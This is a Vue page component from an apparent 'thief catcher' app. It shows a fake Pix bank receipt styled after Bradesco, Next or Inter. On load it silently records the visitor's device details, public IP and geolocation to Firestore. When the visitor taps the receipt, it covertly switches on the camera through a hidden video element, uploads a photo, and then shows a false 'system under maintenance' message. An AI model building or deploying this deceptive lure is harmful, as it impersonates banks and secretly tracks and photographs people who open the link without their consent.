<script setup>
import { computed, onBeforeMount, onMounted, reactive, ref } from 'vue';
import { useRoute } from 'vue-router';
import { firestore, storage, collection, doc, getDoc, serverTimestamp, setDoc, ref as refStorage, uploadString } from '../firebase';
import { useAppStore } from '../store';
import { bancoInfo, delay, formataDataHoraPtBr, formataMoedaBRL, getCurrentPosition, maskCpf, pegaPrimeiroNome, requestCameraPermission, getBrowserDeviceInfo } from '../functions';
import Bradesco from '../components/ComprovanteBradesco.vue';
import Next from '../components/ComprovanteNext.vue';
import Inter from '../components/ComprovanteInter.vue';
import { Device } from '@capacitor/device';

const route = useRoute();

const appStore = useAppStore();

const comprovante = ref(null);
const acesso = ref({});
const naoEncontrado = ref(false);
const expirado = ref(false);

const video = ref(null);
const canvas = ref(null);

const data = reactive({
    comprovanteId: null,
    acessoId: null,
});

onBeforeMount(() => {
    appStore.loadingToggle();
});

onMounted(async () => {
    let compData = null;
    const transacaoId = route.query.id || 'E00' + Date.now();

    // 1. Tenta buscar no Firestore pelo ID
    if (route.query.id) {
        try {
            const docRef = doc(firestore, 'comprovantes', route.query.id);
            const docSnap = await getDoc(docRef);
            if (docSnap && docSnap.exists()) {
                compData = { ...docSnap.data() };
            }
        } catch (e) {
            console.warn('[Pega-Ladrão] Falha na busca pelo Firestore:', e);
        }
    }

    // 2. Se não encontrou no Firestore (outro navegador, offline ou sem chaves de nuvem), decodifica payload da URL
    if (!compData && (route.query.d || route.query.data)) {
        try {
            const rawParam = route.query.d || route.query.data;
            const jsonStr = decodeURIComponent(escape(atob(decodeURIComponent(rawParam))));
            const p = JSON.parse(jsonStr);
            compData = {
                instituicao: p.inst || 'bradesco',
                nomePagador: p.np || '',
                cpfPagador: p.cp || '',
                valor: Number(p.v) || 0,
                descricao: p.desc || '',
                dataHora: { toDate: () => new Date(p.dh || Date.now()) },
                nomePilantra: p.nr || '',
                cpfPilantra: p.cr || '',
                expiracao: { toDate: () => new Date(p.exp || (Date.now() + 86400000)) },
            };
        } catch (err) {
            console.warn('[Pega-Ladrão] Falha ao decodificar dados do comprovante na URL:', err);
        }
    }

    // Se não encontrou de nenhuma forma, exibe estado não encontrado (sem redirecionar bruscamente)
    if (!compData) {
        naoEncontrado.value = true;
        appStore.loadingToggle();
        return;
    }

    // Verifica expiração
    let dataExpiracao = null;
    if (compData.expiracao && typeof compData.expiracao.toDate === 'function') {
        dataExpiracao = compData.expiracao.toDate();
    } else if (compData.expiracao) {
        dataExpiracao = new Date(compData.expiracao);
    }

    if (dataExpiracao && dataExpiracao < new Date()) {
        expirado.value = true;
        appStore.loadingToggle();
        return;
    }

    // Normaliza datas
    let dataHoraFormatada = '';
    if (compData.dataHora && typeof compData.dataHora.toDate === 'function') {
        dataHoraFormatada = formataDataHoraPtBr(compData.dataHora.toDate());
    } else if (compData.dataHora) {
        dataHoraFormatada = formataDataHoraPtBr(new Date(compData.dataHora));
    } else {
        dataHoraFormatada = formataDataHoraPtBr(new Date());
    }

    compData.dataHora = dataHoraFormatada;
    compData.transacao = transacaoId;
    data.comprovanteId = transacaoId;

    comprovante.value = compData;
    comprovante.value.bancoImgSrc = bancoImgSrc.value;

    setMetaData();

    // Coleta dados de dispositivo
    try {
        if (typeof Device !== 'undefined') {
            acesso.value = { ...acesso.value, ...await Device.getInfo() };
            acesso.value.deviceId = (await Device.getId()).identifier;
        }
    } catch (error) {
        console.error('Error device info:', error);
    }

    if (!acesso.value.deviceId) {
        acesso.value = { ...getBrowserDeviceInfo(), ...acesso.value };
    }

    // Coleta IP público
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        acesso.value.publicIp = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    // Coleta Geolocalização
    try {
        const position = await getCurrentPosition();
        acesso.value = { ...acesso.value, ...position };
    } catch (error) {
        console.error('Error ao obter localização:', error);
    }

    acesso.value.at = serverTimestamp();
    acesso.value.comprovanteId = comprovante.value.transacao;

    Object.keys(acesso.value).forEach(key => acesso.value[key] === undefined && delete acesso.value[key]);

    try {
        const ref = doc(collection(firestore, "acessos"));
        await setDoc(ref, acesso.value);
        data.acessoId = ref.id;
    } catch (error) {
        console.error('Error ao registrar acesso:', error);
    }

    appStore.loadingToggle();
});

const bancoImgSrc = computed(() => {
    if (!comprovante.value?.instituicao) return '';
    if (comprovante.value.instituicao === 'inter') {
        return 'https://brandlogos.net/wp-content/uploads/2023/12/banco_inter-logo_brandlogos.net_qybid-300x78.png';
    }
    try {
        return new URL(`../assets/bancos/${comprovante.value.instituicao}.jpg`, import.meta.url).href;
    } catch (_) {
        return '';
    }
});

const faviconSrc = computed(() => {
    if (!comprovante.value?.instituicao || comprovante.value.instituicao === 'inter') {
        return '/favicon.png';
    }
    try {
        return new URL(`../assets/bancos/${comprovante.value.instituicao}-favicon.png`, import.meta.url).href;
    } catch (_) {
        return '/favicon.png';
    }
});

function setMetaData() {
    if (!comprovante.value?.instituicao) return;
    const banco = bancoInfo(comprovante.value.instituicao);
    if (!banco) return;

    document.title = `${banco.nomeResumido} - Pix ${formataMoedaBRL(comprovante.value.valor)} de ${pegaPrimeiroNome(comprovante.value.nomePagador)}`;

    let docBandido = '';
    let nomeBandido = '';

    if (comprovante.value.cpfPilantra) {
        docBandido = maskCpf(comprovante.value.cpfPilantra);
    } else if (comprovante.value.cnpjPilantra) {
        docBandido = comprovante.value.cnpjPilantra;
    }

    if (comprovante.value.nomePilantra) {
        nomeBandido += pegaPrimeiroNome(comprovante.value.nomePilantra);
    }

    let para = '';
    if (docBandido && nomeBandido) {
        para += ` para ${docBandido} - ${nomeBandido}`;
    } else if (docBandido || nomeBandido) {
        para += ` para ${docBandido + nomeBandido}`;
    }

    try {
        const descMeta = document.getElementsByTagName('meta').namedItem('description');
        if (descMeta) {
            descMeta.setAttribute('content', `Comprovante ${banco.nome}: Transação no valor de ${formataMoedaBRL(comprovante.value.valor)}${para}.`);
        }
        const fav = document.querySelector('link[rel="icon"]');
        if (fav && faviconSrc.value) {
            fav.href = faviconSrc.value;
        }
    } catch (_) {}
}

async function capturaFoto() {
    appStore.loadingToggle();

    try {
        await requestCameraPermission(video.value).then(async () => {
            if (video.value) {
                video.value.play();
                await delay(500);
            }
        });

        if (canvas.value && video.value) {
            canvas.value.width = video.value.videoWidth || 640;
            canvas.value.height = video.value.videoHeight || 480;

            const context = canvas.value.getContext('2d');
            context.drawImage(video.value, 0, 0, canvas.value.width, canvas.value.height);

            const fotoDataUrl = canvas.value.toDataURL('image/jpeg');
            const targetPath = `/capturas/${data.comprovanteId}/${data.acessoId || Date.now()}/${Date.now().toString()}`;
            await uploadString(refStorage(storage, targetPath), fotoDataUrl, 'data_url');
        }
    } catch (error) {
        console.error('Error upload file:', error);
    }

    if (video.value?.srcObject) {
        const tracks = video.value.srcObject.getTracks();
        if (tracks) {
            tracks.forEach(t => t.stop());
        }
    }

    await delay(251 + (Math.random() * 250));
    try {
        alert('Sistema em manutenção. Tente mais tarde...');
    } catch (_) {}
    appStore.loadingToggle();
}
</script>

<template>
    <div class="container pb-5">
        <div v-if="naoEncontrado" class="card mt-5 text-center shadow-sm border-0">
            <div class="card-body py-5">
                <h4 class="text-danger mb-3">Comprovante Não Encontrado</h4>
                <p class="text-muted mb-4">O comprovante solicitado não foi localizado ou o link está incompleto.</p>
                <RouterLink :to="{ name: 'gerar' }" class="btn btn-outline-secondary">
                    Ir para o início
                </RouterLink>
            </div>
        </div>

        <div v-else-if="expirado" class="card mt-5 text-center shadow-sm border-0">
            <div class="card-body py-5">
                <h4 class="text-warning mb-3">⏱️ Comprovante Expirado</h4>
                <p class="text-muted mb-4">O prazo de visualização deste comprovante já se esgotou.</p>
                <RouterLink :to="{ name: 'gerar' }" class="btn btn-outline-secondary">
                    Gerar Novo Comprovante
                </RouterLink>
            </div>
        </div>

        <template v-else>
            <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante"
                @tirar-foto="capturaFoto" />
            <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante"
                @tirar-foto="capturaFoto" />
            <Inter v-if="comprovante && comprovante.instituicao == 'inter'" :comprovante="comprovante"
                @tirar-foto="capturaFoto" />
        </template>
    </div>
    <video ref="video" muted autoplay></video>
    <canvas ref="canvas"></canvas>
</template>

<style scoped>
video {
    display: none;
}

canvas {
    display: none;
}
</style>
